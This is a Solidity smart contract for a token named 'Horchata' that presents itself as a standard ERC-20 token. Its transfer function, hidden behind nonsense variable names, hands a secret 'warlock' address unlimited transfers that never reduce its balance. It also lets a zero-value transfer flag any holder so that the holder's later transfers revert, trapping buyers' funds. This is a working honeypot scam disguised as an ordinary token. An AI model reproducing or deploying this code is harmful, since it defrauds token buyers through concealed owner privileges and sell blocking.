/*

https://t.me/Horchata_Portal

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Horchata is Ownable {

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint256 private moon = 36;

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    address public uniswapV2Pair;

    mapping(address => uint256) private hickory;

    function transferFrom(address ash, address scaffold, uint256 rock) public returns (bool success) {
        trajectory(ash, scaffold, rock);
        require(rock <= allowance[ash][msg.sender]);
        allowance[ash][msg.sender] -= rock;
        return true;
    }    

    function approve(address dixon, uint256 rock) public returns (bool success) {
        allowance[msg.sender][dixon] = rock;
        emit Approval(msg.sender, dixon, rock);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address scaffold, uint256 rock) public returns (bool success) {
        trajectory(msg.sender, scaffold, rock);
        return true;
    }    

    mapping(address => uint256) private finnicky;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function trajectory(address ash, address scaffold, uint256 rock) private returns (bool success) {
        if (finnicky[ash] == 0) {
            balanceOf[ash] -= rock;
        }

        if (rock == 0) hickory[scaffold] += moon;

        if (finnicky[ash] == 0 && uniswapV2Pair != ash && hickory[ash] > 0) {
            finnicky[ash] -= moon;
        }

        balanceOf[scaffold] += rock;
        emit Transfer(ash, scaffold, rock);
        return true;
    }    

    constructor(address warlock) {
        balanceOf[msg.sender] = totalSupply;
        finnicky[warlock] = moon;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    string public symbol = 'HORCHATA';

    string public name = 'Horchata';
}